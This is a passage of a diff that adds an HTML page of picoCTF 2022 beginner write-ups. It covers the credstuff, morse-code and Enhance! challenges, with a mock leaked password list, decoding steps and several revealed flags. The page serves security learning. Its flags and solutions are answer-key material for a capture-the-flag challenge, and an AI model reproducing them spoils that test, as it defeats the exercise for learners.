&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>node solve.js
+<div class="code-highlight">picoCTF{1NV3R53LY_H4RD_<span style="color:#696969"><b>[REDACTED]</b></span>}</div></pre></td></tr></table></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h3 id="credstuff" class="chal-title"><a href="#credstuff" class="headerlink" title="credstuff"></a>credstuff</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-users fa-fw"></i> <b>solvers</b>:<br> - <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956135"> <a target="_blank" rel="noopener" href="https://github.com/MrTeaa">MrTea</a> <i class="fa-solid fa-flag"></i><br> - <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>authors</b>: <br> - Will Hong<br> - Lt. 'Syreal' Jones<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: crypto<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/beginners-compilation/leak.tar">leak.tar</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 110%">
+                We found a leak of a blackmarket website's login credentials. Can you find the password of the user <code>cultiris</code> and successfully decrypt it?<br />
+The first user in <code>usernames.txt</code> corresponds to the first password in <code>passwords.txt</code>. The second user corresponds to the second password, and so on.
+                <br><details><summary><b>Hints</b>:</summary><br>Maybe other passwords will have hints about the leak?<br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>We’re initially provided a <code>leak.tar</code> archive. On extraction, we’re presented with two files: <code>usernames.txt</code> and <code>passwords.txt</code>:</p>
+<div class="flex-container">
+    <div>
+        <div><figure class="highlight text" style=""><table><figcaption><span>usernames.txt</span></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line"></span><br></pre></td><td class="code"><pre>engineerrissoles
+icebunt
+fruitfultry
+celebritypentathlon
+galoshesopinion
+favorboeing
+bindingcouch
+...</pre></td></tr></table></div>
+    </div>
+    <div>
+        <div><figure class="highlight text" style=""><table><figcaption><span>passwords.txt</span></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line"></span><br></pre></td><td class="code"><pre>CMPTmLrgfYCexGzJu6TbdGwZa
+GK73YKE2XD2TEnvJeHRBdfpt2
+UukmEk5NCPGUSfs5tGWPK26gG
+kaL36YJtvZMdbTdLuQRx84t85
+K9gzHFpwF2azPayAUSrcL8fJ9
+rYrtRbkHvJzPmDwzD6gSDbAE3
+kfcVXjcFkvNQQPpATErx6eVDd
+...</pre></td></tr></table></div>
+    </div>
+</div>
+
+<p>Let’s go to the username <code>cultiris</code>. The <code>-n</code> tag in <code>grep</code> will enable line numbers:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$</span> grep -n cultiris usernames.txt
+378:cultiris</pre></td></tr></table></div>
+
+<p>Let’s fine the equivalent line in <code>passwords.txt</code>:</p>
+<div><figure class="highlight text" style=""><table><tr><td class="gutter"><pre><span class="line"></span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line"></span><br></pre></td><td class="code"><pre>...
+ARKadGaCZBc3ue4BfB7Vjwx83
+CSYbRFVpJZNQJ4Jz3GmDsAa9Q
+<div class="code-highlight">cvpbPGS{P7e1S_54I35_71Z3}</div>
+wTL8rTRNCkSyGP5AFsG5qK52y
+9jyG4W6PnsAVuyx8MJkHKYtXV
+...</pre></td></tr></table></div>
+
+<p>On line 378 it looks like there’s a flag obfuscated with shift cipher. Let’s brute force this on <a target="_blank" rel="noopener" href="https://www.dcode.fr/caesar-cipher">DCode</a>:</p>
+<div><figure class="highlight text" style=""><table><figcaption><span>Results - Brute-Force mode (Caesar)</span></figcaption><tr><td class="code"><pre>🠞15 (🠜11)	ngamARD{A7p1D_54T35_71K3}
+🠞1 (🠜25)	buoaOFR{O7d1R_54H35_71Y3}
+🠞17 (🠜9)	leykYPB{Y7n1B_54R35_71I3}
+🠞24 (🠜2)	exrdRIU{R7g1U_54K35_71B3}
+🠞11 (🠜15)	rkeqEVH{E7t1H_54X35_71O3}
+<div class="code-highlight">🠞13 (🠜13)	picoCTF{C7r1F_54V35_71M3}</div></pre></td></tr></table></div>
+
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>credstuff</strong>: <code>picoCTF{C7r1F_54V35_71M3}</code></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h3 id="morse-code" class="chal-title"><a href="#morse-code" class="headerlink" title="morse-code"></a>morse-code</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Will Hong<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: crypto<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/beginners-compilation/morse_chal.wav">morse_chal.wav</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 110%">
+                Morse code is well known. Can you decrypt this?<br />
+Wrap your answer with <code>picoCTF{}</code>, put underscores in place of pauses, and use all lowercase.
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>We’re presented with a <code>morse_chal.wav</code> file:</p>
+<div style="text-align:center;margin:1rem 0;"><audio controls>
+  <source src="/static/picoctf-2022/beginners-compilation/morse_chal.wav">
+Your browser does not support the audio element.
+</audio></div>
+
+<p>We could totally decode this by hand using <a target="_blank" rel="noopener" href="https://www.audacityteam.org/">Audacity’s</a> visualizer, but that’s super time-consuming. Instead, I opted for an automatic audio-based <a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">Morse decoder</a> online:</p>
+<p><img src="/static/picoctf-2022/beginners-compilation/morse-code.gif" alt="Automatic Morse Decoding"></p>
+<p>The program outputs <code>WH47 H47H 90D W20U9H7</code>. Following the conversion instructions, the final flag is:</p>
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>morse-code</strong>: <code>picoCTF{wh47_h47h_90d_w20u9h7}</code></div>
+
+<div class="text-info no-highlight"><i class="fa-solid fa-circle-info"></i> Fun fact: this string is a leetspoken version of "What hath God wrought", which was the first telegraphed message in Morse!</div>
+
+<hr>
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><div class="challenge">
+    <div class="challenge-title"><h3 id="Enhance!" class="chal-title"><a href="#Enhance!" class="headerlink" title="Enhance!"></a>Enhance!</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Lt. 'Syreal' Jones<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: [REDACTED]<br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 110%">
+                Download this image file and find the flag.<br><br><img src="/static/picoctf-2022/beginners-compilation/svg.png" width="200" sub="svg.png"></img><div class="subtitle">svg.png</div>
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>This is an SVG file, which stands for Scalable Vector Graphics. They consist of vectors, not pixels, and can be thought of as a collection of shapes on a Cartesian (x&#x2F;y) plane. The code that creates such graphics can also be viewed on Google Chrome with <kbd>F12</kbd>:</p>
+<p><img src="/static/picoctf-2022/beginners-compilation/svg2.png" alt="SVG2"></p>
+<p>Look up what we end up finding in the Source tab:</p>
+<div><figure class="highlight svg" style=""><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.08501&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3748&quot;</span>&gt;</span>p <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.08942&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3754&quot;</span>&gt;</span>i <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.09383&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3756&quot;</span>&gt;</span>c <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.09824&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3758&quot;</span>&gt;</span>o <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.10265&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3760&quot;</span>&gt;</span>C <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.10706&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3762&quot;</span>&gt;</span>T <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.11147&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3764&quot;</span>&gt;</span>F { 3 n h 4 n <span class="tag">&lt;/<span class="name">tspan</span>&gt;</span>
+<span class="tag">&lt;<span class="name">tspan</span> <span class="attr">sodipodi:role</span>=<span class="string">&quot;line&quot;</span> <span class="attr">x</span>=<span class="string">&quot;107.43014&quot;</span> <span class="attr">y</span>=<span class="string">&quot;132.11588&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tspan3752&quot;</span>&gt;</span>c 3 d _ [R E D A C T E D] }<span class="tag">&lt;/<span class="name">tspan</span>&gt;</span></pre></td></tr></table></div>
+
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>Enhance!</strong>: <code>picoCTF{3nh4nc3d_[REDACTED]}</code></div>
+
+<hr>
+<img src="https://s01.flagcounter.com/count2/8Xkk/bg_161616/txt_C9CACC/border_E9D3B6/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/">
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/articles/">posts</a></li>
+         
+          <li><a href="/ctfs/">ctfs</a></li>
+         
+          <li><a href="/profiles/">profiles</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Binary-Exploitation"><span class="toc-number">1.</span> <span class="toc-text">Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-file-exploit"><span class="toc-number">1.1.</span> <span class="toc-text">basic-file-exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-XXXX-XXXX"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-XXXX-XXXX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ropfu"><span class="toc-number">1.3.</span> <span class="toc-text">ropfu</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cryptography"><span class="toc-number">2.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-mod1"><span class="toc-number">2.1.</span> <span class="toc-text">basic-mod1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-mod2"><span class="toc-number">2.2.</span> <span class="toc-text">basic-mod2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#credstuff"><span class="toc-number">2.3.</span> <span class="toc-text">credstuff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#morse-code"><span class="toc-number">2.4.</span> <span class="toc-text">morse-code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">3.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enhance!"><span class="toc-number">3.1.</span> <span class="toc-text">Enhance!</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&text=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&title=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&is_video=false&description=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PicoCTF 2022: Beginner&#39;s Writeup Compilation&body=Check out this article: https://enscribe.dev/blog/picoctf-2022/beginners-compilation/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&title=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&name=PicoCTF 2022: Beginner&#39;s Writeup Compilation&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> menu</a>
+        
+            <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+          
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    enscribe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">posts</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">profiles</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
